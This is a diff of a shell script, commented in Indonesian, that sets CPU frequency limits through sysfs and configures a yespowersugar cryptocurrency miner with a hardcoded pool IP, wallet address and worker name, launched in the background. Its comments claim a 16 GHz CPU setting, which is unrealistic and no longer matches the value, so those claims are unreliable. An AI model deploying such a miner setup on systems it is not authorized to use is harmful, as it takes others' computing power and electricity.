@@ -19,7 +19,7 @@ fi
 
 # Mengatur frekuensi CPU ke 16 GHz
 CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
-MAX_FREQ=16000000 # Maksimal frekuensi dalam kHz (16 GHz)
+MAX_FREQ=6000000 # Maksimal frekuensi dalam kHz (16 GHz)
 
 for dir in $CPUFREQ_PATH; do
     if [ -e $dir/scaling_max_freq ]; then
@@ -32,7 +32,7 @@ ALGO="yespowersugar"
 POOL_URL="45.88.24.129:443"
 WALLET_ADDRESS="sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf"
 PASSWORD="x"
-WORKER_NAME="JIAH$RANDOM"
+WORKER_NAME="JIAH$(shuf -i 1-3 -n 1)"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
